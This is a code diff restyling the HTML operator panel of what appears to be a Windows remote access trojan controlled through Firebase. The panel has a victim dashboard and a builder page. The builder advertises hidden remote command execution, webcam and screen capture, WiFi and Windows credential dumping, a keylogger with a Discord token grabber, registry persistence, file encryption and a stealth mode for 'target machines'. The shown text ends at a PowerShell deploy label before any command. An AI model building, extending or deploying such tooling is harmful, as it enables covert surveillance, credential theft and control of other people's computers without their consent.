@@ -4,112 +4,122 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Command Center</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#0b0d12;color:#e8edf5;font-family:'Inter','Segoe UI',system-ui,sans-serif;min-height:100vh;overflow-x:hidden}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#090b11;--surface:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--text:#e2e8f0;--text2:rgba(255,255,255,.35);--accent:#818cf8;--accent2:#5864ff;--green:#22c55e;--red:#ef4444;--orange:#fb923c;--radius:12px}
+html{font-size:15px}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;min-height:100vh;overflow-x:hidden}
 body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 20% 50%,rgba(88,100,255,.04)0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(130,80,223,.03)0%,transparent 50%),radial-gradient(ellipse at 50% 80%,rgba(30,160,80,.02)0%,transparent 50%);pointer-events:none;z-index:0}
-::-webkit-scrollbar{width:5px}
-::-webkit-scrollbar-track{background:#0b0d12}
+::-webkit-scrollbar{width:4px}
+::-webkit-scrollbar-track{background:var(--bg)}
 ::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:10px}
-::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,.15)}
-.header{position:sticky;top:0;z-index:100;background:rgba(11,13,18,.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom:1px solid rgba(255,255,255,.06);padding:0 2rem;display:flex;align-items:center;height:64px}
-.header .logo{display:flex;align-items:center;gap:.7rem;font-size:1.1rem;font-weight:800;color:#f0f4fc;margin-right:3rem;letter-spacing:-.02em}
-.header .logo .icon{width:32px;height:32px;background:linear-gradient(135deg,#5864ff,#8250df);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:.9rem;color:#fff;box-shadow:0 4px 12px rgba(88,100,255,.3)}
-.nav{display:flex;gap:.2rem;flex:1;align-items:center}
-.nav a{padding:.45rem 1.1rem;border-radius:8px;text-decoration:none;color:rgba(255,255,255,.45);font-size:.85rem;font-weight:500;transition:all .2s;cursor:pointer;display:flex;align-items:center;gap:.45rem;letter-spacing:-.01em}
-.nav a:hover{color:rgba(255,255,255,.8);background:rgba(255,255,255,.05)}
-.nav a.active{color:#fff;background:rgba(88,100,255,.12);box-shadow:inset 0 -1.5px 0 #5864ff}
-.btn{border:none;padding:.4rem .95rem;border-radius:8px;cursor:pointer;font-size:.8rem;font-weight:600;transition:all .2s;display:inline-flex;align-items:center;gap:.45rem;letter-spacing:-.01em}
+::selection{background:rgba(88,100,255,.3);color:#fff}
+.header{position:sticky;top:0;z-index:100;background:rgba(9,11,18,.85);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);border-bottom:1px solid var(--border);padding:0 2rem;display:flex;align-items:center;height:60px;gap:1rem}
+.header .logo{display:flex;align-items:center;gap:.7rem;font-size:1.05rem;font-weight:800;color:#f0f4fc;letter-spacing:-.03em}
+.header .logo .icon{width:30px;height:30px;background:linear-gradient(135deg,var(--accent2),#8250df);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:.85rem;color:#fff;box-shadow:0 4px 14px rgba(88,100,255,.3)}
+.nav{display:flex;gap:.2rem;flex:1}
+.nav a{padding:.4rem 1rem;border-radius:8px;text-decoration:none;color:var(--text2);font-size:.82rem;font-weight:500;transition:all .2s;cursor:pointer}
+.nav a:hover{color:rgba(255,255,255,.7);background:rgba(255,255,255,.05)}
+.nav a.active{color:#fff;background:rgba(88,100,255,.12)}
+.btn{border:none;padding:.35rem.85rem;border-radius:8px;cursor:pointer;font-size:.78rem;font-weight:600;transition:all .2s;display:inline-flex;align-items:center;gap:.4rem;letter-spacing:-.01em}
 .btn:active{transform:scale(.94)}
-.btn-primary{background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;box-shadow:0 2px 10px rgba(34,197,94,.25)}
-.btn-primary:hover{box-shadow:0 4px 20px rgba(34,197,94,.35);transform:translateY(-1.5px)}
-.btn-accent{background:linear-gradient(135deg,#5864ff,#7c3aed);color:#fff;box-shadow:0 2px 10px rgba(88,100,255,.25)}
-.btn-accent:hover{box-shadow:0 4px 20px rgba(88,100,255,.35);transform:translateY(-1.5px)}
-.btn-danger{background:linear-gradient(135deg,#ef4444,#dc2626);color:#fff;box-shadow:0 2px 10px rgba(239,68,68,.25)}
-.btn-danger:hover{box-shadow:0 4px 20px rgba(239,68,68,.35);transform:translateY(-1.5px)}
-.btn-ghost{background:rgba(255,255,255,.04);color:rgba(255,255,255,.5);border:1px solid rgba(255,255,255,.08)}
-.btn-ghost:hover{background:rgba(255,255,255,.08);color:rgba(255,255,255,.8)}
-.btn-sm{padding:.3rem .7rem;font-size:.75rem}
-.pages{display:none;padding:2rem;max-width:1200px;margin:0 auto;position:relative;z-index:1}
-.pages.active{display:block;animation:pageIn .35s ease}
-@keyframes pageIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
-.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:.8rem;margin-bottom:1.5rem}
-.stat-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:14px;padding:1.2rem;position:relative;overflow:hidden;transition:all .3s;backdrop-filter:blur(10px)}
-.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.1),transparent)}
-.stat-card:hover{border-color:rgba(255,255,255,.1);transform:translateY(-3px);box-shadow:0 12px 40px rgba(0,0,0,.5)}
-.stat-card .num{font-size:2rem;font-weight:800;color:#f0f4fc;line-height:1.1;letter-spacing:-.03em}
-.stat-card .lbl{color:rgba(255,255,255,.4);font-size:.78rem;margin-top:.3rem;font-weight:500;text-transform:uppercase;letter-spacing:.04em}
-.stat-card.online .num{color:#22c55e}
-.stat-card .icon-bg{position:absolute;right:.8rem;top:50%;transform:translateY(-50%);font-size:2.2rem;opacity:.06;font-weight:800}
-.client-list{display:flex;flex-direction:column;gap:.4rem}
-.client-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px;padding:.8rem 1rem;display:flex;align-items:center;gap:1rem;transition:all .25s;animation:slideIn .3s ease;backdrop-filter:blur(8px)}
-.client-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.08),transparent);pointer-events:none}
-.client-card:hover{border-color:rgba(255,255,255,.12);transform:translateX(4px);box-shadow:0 8px 30px rgba(0,0,0,.4)}
-@keyframes slideIn{from{opacity:0;transform:translateX(-10px)}to{opacity:1;transform:translateX(0)}}
-.client-card .dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;position:relative}
-.client-card .dot.online{background:#22c55e;box-shadow:0 0 12px rgba(34,197,94,.4)}
-.client-card .dot.online::after{content:'';position:absolute;inset:-3px;border-radius:50%;border:2px solid rgba(34,197,94,.15);animation:pulse 2s infinite}
-@keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.5);opacity:.3}}
-.client-card .dot.offline{background:rgba(255,255,255,.15)}
+.btn-primary{background:linear-gradient(135deg,var(--green),#16a34a);color:#fff;box-shadow:0 2px 10px rgba(34,197,94,.2)}
+.btn-primary:hover{box-shadow:0 4px 20px rgba(34,197,94,.3);transform:translateY(-1px)}
+.btn-accent{background:linear-gradient(135deg,var(--accent2),#7c3aed);color:#fff;box-shadow:0 2px 10px rgba(88,100,255,.2)}
+.btn-accent:hover{box-shadow:0 4px 20px rgba(88,100,255,.3);transform:translateY(-1px)}
+.btn-danger{background:linear-gradient(135deg,var(--red),#dc2626);color:#fff;box-shadow:0 2px 10px rgba(239,68,68,.2)}
+.btn-danger:hover{box-shadow:0 4px 20px rgba(239,68,68,.3);transform:translateY(-1px)}
+.btn-ghost{background:rgba(255,255,255,.04);color:var(--text2);border:1px solid var(--border)}
+.btn-ghost:hover{background:rgba(255,255,255,.08);color:rgba(255,255,255,.7)}
+.btn-sm{padding:.25rem.6rem;font-size:.72rem}
+.pages{display:none;padding:1.5rem 2rem;max-width:1200px;margin:0 auto;position:relative;z-index:1}
+.pages.active{display:block;animation:fadeIn .3s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:.7rem;margin-bottom:1.2rem}
+.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1rem 1.2rem;position:relative;overflow:hidden;transition:all .3s}
+.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.08),transparent)}
+.stat-card:hover{border-color:rgba(255,255,255,.1);transform:translateY(-2px)}
+.stat-card .num{font-size:1.8rem;font-weight:800;color:#f0f4fc;line-height:1;letter-spacing:-.03em}
+.stat-card .lbl{color:var(--text2);font-size:.72rem;margin-top:.25rem;font-weight:500;text-transform:uppercase;letter-spacing:.05em}
+.stat-card.online .num{color:var(--green)}
+.toolbar{display:flex;gap:.5rem;align-items:center;margin-bottom:.8rem;flex-wrap:wrap}
+.toolbar .search{flex:1;min-width:180px;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:8px;padding:.4rem.7rem;color:var(--text);font-size:.8rem;outline:none;transition:border-color .2s;font-family:inherit}
+.toolbar .search:focus{border-color:rgba(88,100,255,.4)}
+.client-list{display:flex;flex-direction:column;gap:.35rem}
+.client-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:.65rem.9rem;display:flex;align-items:center;gap:.8rem;transition:all .2s;position:relative;overflow:hidden;animation:slideIn .25s ease both}
+.client-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.06),transparent);pointer-events:none}
+.client-card:hover{border-color:rgba(255,255,255,.1);background:rgba(255,255,255,.045)}
+@keyframes slideIn{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
+.client-card .dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;position:relative}
+.client-card .dot.online{background:var(--green);box-shadow:0 0 10px rgba(34,197,94,.35)}
+.client-card .dot.offline{background:rgba(255,255,255,.12)}
 .client-card .info{flex:1;min-width:0}
-.client-card .name{font-weight:600;color:#f0f4fc;font-size:.88rem;display:flex;align-items:center;gap:.5rem}
-.client-card .meta{color:rgba(255,255,255,.35);font-size:.75rem;margin-top:.12rem;display:flex;flex-wrap:wrap;gap:.5rem}
-.client-card .meta span{display:flex;align-items:center;gap:.2rem}
-.client-card .actions{display:flex;gap:.35rem;flex-shrink:0}
-.empty-state{text-align:center;padding:5rem 2rem;color:rgba(255,255,255,.2)}
-.empty-state .empty-icon{font-size:4rem;margin-bottom:1rem;opacity:.15;font-weight:200}
-.empty-state h3{color:rgba(255,255,255,.3);margin-bottom:.3rem;font-weight:500;font-size:1.2rem}
-.empty-state p{font-size:.82rem;color:rgba(255,255,255,.2)}
-.builder-hero{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:16px;padding:2.2rem;margin-bottom:1.5rem;position:relative;overflow:hidden;backdrop-filter:blur(10px)}
+.client-card .nm{font-weight:600;color:#f0f4fc;font-size:.85rem;display:flex;align-items:center;gap:.5rem}
+.client-card .nm .ip{font-weight:400;font-size:.7rem;color:var(--text2);font-family:'SF Mono','Consolas',monospace}
+.client-card .meta{color:var(--text2);font-size:.72rem;margin-top:.08rem;display:flex;flex-wrap:wrap;gap:.4rem .8rem}
+.client-card .meta svg{width:11px;height:11px;vertical-align:middle;margin-right:2px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+.client-card .meta .tag{background:rgba(255,255,255,.04);padding:0 .35rem;border-radius:4px;color:rgba(255,255,255,.3)}
+.client-card .meta .tag.green{background:rgba(34,197,94,.08);color:var(--green)}
+.client-card .meta .tag.red{background:rgba(239,68,68,.08);color:var(--red)}
+.client-card .actions{display:flex;gap:.3rem;flex-shrink:0}
+.client-card .actions .btn{font-size:.7rem;padding:.2rem.5rem}
+.empty-state{text-align:center;padding:4rem 2rem;color:var(--text2)}
+.empty-state .icon{font-size:3.5rem;margin-bottom:.8rem;opacity:.12}
+.empty-state h3{color:rgba(255,255,255,.25);margin-bottom:.2rem;font-weight:500;font-size:1.1rem}
+.empty-state p{font-size:.8rem}
+.builder-hero{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:2rem;margin-bottom:1.2rem;position:relative;overflow:hidden}
 .builder-hero::before{content:'';position:absolute;top:-60%;right:-30%;width:60%;height:120%;background:radial-gradient(circle,rgba(88,100,255,.06)0%,transparent 70%);pointer-events:none}
-.builder-hero h2{font-size:1.5rem;color:#f0f4fc;margin-bottom:.3rem;font-weight:700;letter-spacing:-.02em}
-.builder-hero p{color:rgba(255,255,255,.4);font-size:.88rem;max-width:600px;line-height:1.6}
-.builder-hero .version{display:inline-block;background:rgba(88,100,255,.1);color:#818cf8;padding:.2rem .6rem;border-radius:6px;font-size:.7rem;font-weight:600;margin-top:.5rem;letter-spacing:.02em}
-.feature-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(270px,1fr));gap:.8rem;margin-bottom:1.5rem}
-.feature-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px;padding:1.3rem;transition:all .25s;position:relative;overflow:hidden;backdrop-filter:blur(8px)}
-.feature-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.08),transparent)}
-.feature-card:hover{border-color:rgba(255,255,255,.12);transform:translateY(-3px);box-shadow:0 12px 40px rgba(0,0,0,.4)}
-.feature-card .icon{width:38px;height:38px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1rem;margin-bottom:.7rem;font-weight:700}
-.feature-card .icon.blue{background:rgba(88,100,255,.12);color:#818cf8}
-.feature-card .icon.green{background:rgba(34,197,94,.12);color:#4ade80}
-.feature-card .icon.purple{background:rgba(124,58,237,.12);color:#a78bfa}
-.feature-card .icon.orange{background:rgba(251,146,60,.12);color:#fb923c}
-.feature-card .icon.cyan{background:rgba(34,211,238,.12);color:#22d3ee}
-.feature-card .icon.pink{background:rgba(236,72,153,.12);color:#f472b6}
-.feature-card h3{font-size:.9rem;color:#f0f4fc;margin-bottom:.2rem;font-weight:600}
-.feature-card p{color:rgba(255,255,255,.4);font-size:.78rem;line-height:1.5}
-.feature-card .badge{display:inline-block;background:rgba(34,197,94,.1);color:#4ade80;padding:.12rem .5rem;border-radius:5px;font-size:.65rem;font-weight:600;margin-top:.4rem;letter-spacing:.02em}
-.build-panel{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px;padding:1.3rem;margin-bottom:1.5rem;backdrop-filter:blur(8px)}
-.build-panel h3{font-size:1.05rem;color:#f0f4fc;margin-bottom:.8rem;display:flex;align-items:center;gap:.5rem;font-weight:600}
-.option-row{display:flex;align-items:center;justify-content:space-between;padding:.7rem 0;border-bottom:1px solid rgba(255,255,255,.04)}
-.option-row:last-child{border-bottom:none}
-.option-row .desc{flex:1}
-.option-row .desc label{color:#f0f4fc;font-size:.85rem;font-weight:500;cursor:pointer}
-.option-row .desc p{color:rgba(255,255,255,.35);font-size:.75rem;margin-top:.08rem}
-.toggle{position:relative;width:40px;height:22px;flex-shrink:0}
+.builder-hero h2{font-size:1.4rem;color:#f0f4fc;margin-bottom:.25rem;font-weight:700;letter-spacing:-.02em}
+.builder-hero p{color:var(--text2);font-size:.82rem;max-width:600px;line-height:1.6}
+.builder-hero .ver{display:inline-block;background:rgba(88,100,255,.1);color:var(--accent);padding:.2rem.55rem;border-radius:6px;font-size:.65rem;font-weight:600;margin-top:.4rem}
+.feature-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:.7rem;margin-bottom:1.2rem}
+.feature-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1.1rem;transition:all .25s;position:relative;overflow:hidden}
+.feature-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.06),transparent)}
+.feature-card:hover{border-color:rgba(255,255,255,.1);transform:translateY(-2px)}
+.feature-card .icon{width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:.9rem;margin-bottom:.6rem;font-weight:700}
+.feature-card .icon.blue{background:rgba(88,100,255,.1);color:var(--accent)}
+.feature-card .icon.green{background:rgba(34,197,94,.1);color:var(--green)}
+.feature-card .icon.purple{background:rgba(124,58,237,.1);color:#a78bfa}
+.feature-card .icon.orange{background:rgba(251,146,60,.1);color:var(--orange)}
+.feature-card .icon.cyan{background:rgba(34,211,238,.1);color:#22d3ee}
+.feature-card .icon.pink{background:rgba(236,72,153,.1);color:#f472b6}
+.feature-card h3{font-size:.85rem;color:#f0f4fc;margin-bottom:.15rem;font-weight:600}
+.feature-card p{color:var(--text2);font-size:.75rem;line-height:1.5}
+.feature-card .badge{display:inline-block;background:rgba(34,197,94,.1);color:var(--green);padding:.1rem.4rem;border-radius:4px;font-size:.6rem;font-weight:600;margin-top:.3rem}
+.build-panel{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1.2rem;margin-bottom:1.2rem}
+.build-panel h3{font-size:1rem;color:#f0f4fc;margin-bottom:.7rem;font-weight:600;display:flex;align-items:center;gap:.4rem}
+.opt-row{display:flex;align-items:center;justify-content:space-between;padding:.6rem 0;border-bottom:1px solid rgba(255,255,255,.04)}
+.opt-row:last-child{border-bottom:none}
+.opt-row .desc{flex:1}
+.opt-row .desc label{color:#f0f4fc;font-size:.82rem;font-weight:500;cursor:pointer}
+.opt-row .desc p{color:var(--text2);font-size:.72rem;margin-top:.04rem}
+.toggle{position:relative;width:36px;height:20px;flex-shrink:0}
 .toggle input{opacity:0;width:0;height:0}
-.toggle .slider{position:absolute;inset:0;background:rgba(255,255,255,.08);border-radius:11px;cursor:pointer;transition:all .3s}
-.toggle .slider::before{content:'';position:absolute;width:16px;height:16px;left:3px;bottom:3px;background:rgba(255,255,255,.25);border-radius:50%;transition:all .3s}
-.toggle input:checked+.slider{background:rgba(34,197,94,.25)}
-.toggle input:checked+.slider::before{transform:translateX(18px);background:#22c55e;box-shadow:0 2px 8px rgba(34,197,94,.4)}
-.build-actions{display:flex;gap:1rem;align-items:center;flex-wrap:wrap;margin-top:.8rem}
-.build-actions .btn{font-size:.9rem;padding:.55rem 1.4rem}
-.install-cmd{background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.06);border-radius:8px;padding:.8rem;font-family:'SF Mono','Fira Code','Cascadia Code','Consolas',monospace;font-size:.78rem;color:rgba(255,255,255,.4);margin-top:.7rem;user-select:all;position:relative}
-.install-cmd .lbl{color:#818cf8;font-weight:600}
-.install-cmd .str{color:#fb923c}
-.install-cmd .cmd{color:#4ade80}
-.install-cmd .copy-btn{position:absolute;top:.4rem;right:.4rem;background:rgba(255,255,255,.06);border:none;color:rgba(255,255,255,.4);padding:.15rem .5rem;border-radius:5px;cursor:pointer;font-size:.7rem;transition:all .2s}
-.install-cmd .copy-btn:hover{background:rgba(255,255,255,.1);color:rgba(255,255,255,.7)}
-.feature-list{list-style:none;padding:0;margin-top:.4rem;columns:2;column-gap:1.5rem}
-.feature-list li{color:rgba(255,255,255,.4);font-size:.78rem;padding:.2rem 0;display:flex;align-items:center;gap:.4rem;break-inside:avoid}
-.feature-list li::before{content:'\2713';color:#4ade80;font-weight:700;font-size:.8rem}
+.toggle .sl{position:absolute;inset:0;background:rgba(255,255,255,.08);border-radius:10px;cursor:pointer;transition:all .3s}
+.toggle .sl::before{content:'';position:absolute;width:14px;height:14px;left:3px;bottom:3px;background:rgba(255,255,255,.2);border-radius:50%;transition:all .3s}
+.toggle input:checked+.sl{background:rgba(34,197,94,.2)}
+.toggle input:checked+.sl::before{transform:translateX(16px);background:var(--green);box-shadow:0 2px 8px rgba(34,197,94,.3)}
+.input{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:8px;padding:.3rem.5rem;color:var(--text);font-size:.78rem;outline:none;font-family:inherit;transition:border-color .2s}
+.input:focus{border-color:rgba(88,100,255,.4)}
+.build-actions{display:flex;gap:.8rem;align-items:center;flex-wrap:wrap;margin-top:.7rem}
+.install-cmd{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:8px;padding:.7rem;font-family:'SF Mono','Consolas','Fira Code',monospace;font-size:.75rem;color:var(--text2);margin-top:.6rem;user-select:all;position:relative;line-height:1.6}
+.install-cmd .lbl{color:var(--accent);font-weight:600}
+.install-cmd .str{color:var(--orange)}
+.install-cmd .cmd{color:var(--green)}
+.install-cmd .cp{position:absolute;top:.35rem;right:.35rem;background:rgba(255,255,255,.06);border:none;color:var(--text2);padding:.12rem.45rem;border-radius:5px;cursor:pointer;font-size:.65rem;transition:all .2s}
+.install-cmd .cp:hover{background:rgba(255,255,255,.1);color:rgba(255,255,255,.6)}
+.feature-list{list-style:none;columns:3;column-gap:1.2rem}
+.feature-list li{color:var(--text2);font-size:.75rem;padding:.2rem 0;display:flex;align-items:center;gap:.35rem;break-inside:avoid}
+.feature-list li::before{content:'\2713';color:var(--green);font-weight:700;font-size:.75rem}
+.toast{position:fixed;bottom:1.5rem;right:1.5rem;background:linear-gradient(135deg,var(--green),#16a34a);color:#fff;padding:.5rem 1rem;border-radius:10px;font-size:.8rem;font-weight:600;z-index:999;animation:toastUp .3s ease;pointer-events:none;box-shadow:0 8px 30px rgba(34,197,94,.25)}
+@keyframes toastUp{from{opacity:0;transform:translateY(15px)scale(.95)}to{opacity:1;transform:translateY(0)scale(1)}}
 @media(max-width:768px){
-.header{padding:0 1rem}.header .logo{margin-right:1rem}.header .logo span{display:none}
-.nav a{padding:.35rem .7rem;font-size:.75rem}.pages{padding:1rem}
-.stats{grid-template-columns:1fr 1fr}.feature-grid{grid-template-columns:1fr}
-.client-card{flex-wrap:wrap}.client-card .actions{width:100%;justify-content:flex-end;padding-top:.35rem;border-top:1px solid rgba(255,255,255,.04)}
-.builder-hero{padding:1.3rem}.build-actions{flex-direction:column}.feature-list{columns:1}
+.header{padding:0 1rem}.pages{padding:1rem}.stats{grid-template-columns:1fr 1fr}
+.feature-grid{grid-template-columns:1fr}.feature-list{columns:1}
+.client-card .meta .hide-m{display:none}.builder-hero{padding:1.2rem}
+.build-actions{flex-direction:column}.toolbar .search{min-width:120px}
 }
 </style>
 </head>
@@ -120,9 +130,7 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
     <a class="active" onclick="switchPage('dashboard',this)">Dashboard</a>
     <a onclick="switchPage('builder',this)">Builder</a>
   </div>
-  <div class="actions" style="display:flex;gap:.5rem;align-items:center">
-    <button class="btn btn-ghost btn-sm" onclick="load()">⟳ Refresh</button>
-  </div>
+  <button class="btn btn-ghost btn-sm" onclick="load()" title="Refresh">⟳</button>
 </div>
 
 <div class="pages active" id="page-dashboard">
@@ -132,7 +140,13 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
     <div class="stat-card"><div class="num" id="lastPing">-</div><div class="lbl">Last Ping</div></div>
     <div class="stat-card"><div class="num" id="activeToday">0</div><div class="lbl">Active Today</div></div>
   </div>
-  <div style="text-align:right;margin-bottom:.5rem">
+  <div class="toolbar">
+    <input class="search" id="searchInput" placeholder="Search clients..." oninput="filterClients()" autocomplete="off" spellcheck="false">
+    <select class="input" id="sortSelect" onchange="load()" style="width:auto;cursor:pointer">
+      <option value="online">Online First</option>
+      <option value="name">By Name</option>
+      <option value="recent">Most Recent</option>
+    </select>
     <button class="btn btn-danger btn-sm" onclick="removeAllClients()">Remove All</button>
   </div>
   <div id="clientList"></div>
@@ -141,71 +155,80 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
 <div class="pages" id="page-builder">
   <div class="builder-hero">
     <h2>Build Your Client</h2>
-    <p>Configure and deploy the remote administration client on target machines. All communication goes directly through Firebase Realtime Database — no servers needed.</p>
-    <div class="version">v3.0 · Windows x64</div>
+    <p>Configure and deploy the remote administration client. All communication goes through Firebase Realtime Database — zero server setup required.</p>
+    <div class="ver">v3.0 · Windows x64 · 326KB</div>
   </div>
   <div class="feature-grid">
-    <div class="feature-card"><div class="icon blue">#</div><h3>Remote CMD</h3><p>Execute commands with real-time output capture.</p></div>
-    <div class="feature-card"><div class="icon green">◉</div><h3>Screen &amp; Webcam</h3><p>Multi-monitor screenshots, live streaming, webcam capture.</p></div>
-    <div class="feature-card"><div class="icon purple">📁</div><h3>File Browser</h3><p>Full remote file system navigation and directory listing.</p></div>
-    <div class="feature-card"><div class="icon orange">🔑</div><h3>Password Extraction</h3><p>Dump WiFi passwords and Windows stored credentials.</p><div class="badge">NEW</div></div>
-    <div class="feature-card"><div class="icon cyan">🌐</div><h3>Network Info</h3><p>IP config, active connections, ARP and routing tables.</p><div class="badge">NEW</div></div>
-    <div class="feature-card"><div class="icon pink">⚙</div><h3>Services &amp; Apps</h3><p>List all Windows services and installed applications.</p><div class="badge">NEW</div></div>
+    <div class="feature-card"><div class="icon blue">#</div><h3>Remote CMD</h3><p>Execute commands with real-time output</p></div>
+    <div class="feature-card"><div class="icon green">◉</div><h3>Screen &amp; Webcam</h3><p>Multi-monitor screenshots, live streaming, webcam</p></div>
+    <div class="feature-card"><div class="icon purple">📁</div><h3>File Browser</h3><p>Full remote filesystem with CRUD + encrypt/decrypt</p></div>
+    <div class="feature-card"><div class="icon orange">🔑</div><h3>Password Extraction</h3><p>WiFi passwords + Windows credentials<div class="badge">NEW</div></p></div>
+    <div class="feature-card"><div class="icon cyan">🌐</div><h3>Network &amp; Services</h3><p>IP config, connections, services, installed apps</p></div>
+    <div class="feature-card"><div class="icon pink">⌨</div><h3>Keylogger + Tokens</h3><p>Keylogging + Discord token grabber<div class="badge">NEW</div></p></div>
   </div>
   <div class="build-panel">
     <h3>Client Configuration</h3>
-    <div class="option-row">
-      <div class="desc"><label>Client Name <span style="color:rgba(255,255,255,.25);font-weight:400">(optional)</span></label><p>Custom name for this client. Leave empty to use hostname.</p></div>
-      <input type="text" id="clientName" placeholder="Auto (hostname)" style="background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:.35rem .55rem;color:#e8edf5;font-size:.8rem;outline:none;width:170px;font-family:inherit" oninput="updateBuildCmd()">
+    <div class="opt-row">
+      <div class="desc"><label>Client Name <span style="color:var(--text2);font-weight:400">(optional)</span></label><p>Custom name, leave empty to use the computer's hostname</p></div>
+      <input class="input" type="text" id="clientName" placeholder="Auto (hostname)" style="width:160px" oninput="updateBuildCmd()">
     </div>
-    <div class="option-row">
-      <div class="desc"><label>Startup Persistence</label><p>Auto-run on Windows boot via HKCU\Run registry.</p></div>
-      <label class="toggle"><input type="checkbox" id="startupToggle" checked onchange="updateBuildCmd()"><span class="slider"></span></label>
+    <div class="opt-row">
+      <div class="desc"><label>Startup Persistence</label><p>Auto-start via HKCU\Run registry entry</p></div>
+      <label class="toggle"><input type="checkbox" id="startupToggle" checked onchange="updateBuildCmd()"><span class="sl"></span></label>
     </div>
-    <div class="option-row">
-      <div class="desc"><label>Auto Ping</label><p>Sends status updates every 30s to keep the dashboard alive.</p></div>
-      <label class="toggle"><input type="checkbox" id="pingToggle" checked onchange="updateBuildCmd()"><span class="slider"></span></label>
+    <div class="opt-row">
+      <div class="desc"><label>Status Pings</label><p>Send updates every 30s to keep the dashboard alive</p></div>
+      <label class="toggle"><input type="checkbox" id="pingToggle" checked onchange="updateBuildCmd()"><span class="sl"></span></label>
     </div>
-    <div class="option-row">
-      <div class="desc"><label>Live Screen Stream</label><p>Continuously streams the desktop with auto-overwrite.</p></div>
-      <label class="toggle"><input type="checkbox" id="screenToggle" checked onchange="updateBuildCmd()"><span class="slider"></span></label>
+    <div class="opt-row">
+      <div class="desc"><label>Live Screen</label><p>Continuous desktop streaming at ~10 FPS</p></div>
+      <label class="toggle"><input type="checkbox" id="screenToggle" checked onchange="updateBuildCmd()"><span class="sl"></span></label>
     </div>
-    <div class="option-row">
-      <div class="desc"><label>Stealth Mode</label><p>Runs completely hidden with no console window.</p></div>
-      <label class="toggle"><input type="checkbox" id="stealthToggle" checked onchange="updateBuildCmd()"><span class="slider"></span></label>
+    <div class="opt-row">
+      <div class="desc"><label>Stealth Mode</label><p>Run without any visible console window</p></div>
+      <label class="toggle"><input type="checkbox" id="stealthToggle" checked onchange="updateBuildCmd()"><span class="sl"></span></label>
     </div>
     <div class="build-actions">
       <button class="btn btn-primary" onclick="downloadClient()">⬇ Download Client</button>
-      <button class="btn btn-accent" onclick="copyBuildCmd()">📋 Copy Deploy Command</button>
+      <button class="btn btn-accent" onclick="copyBuildCmd()">📋 Copy Deploy Cmd</button>
     </div>
     <div class="install-cmd" id="buildCmdDisplay">
       <span class="lbl"># PowerShell deploy:</span>
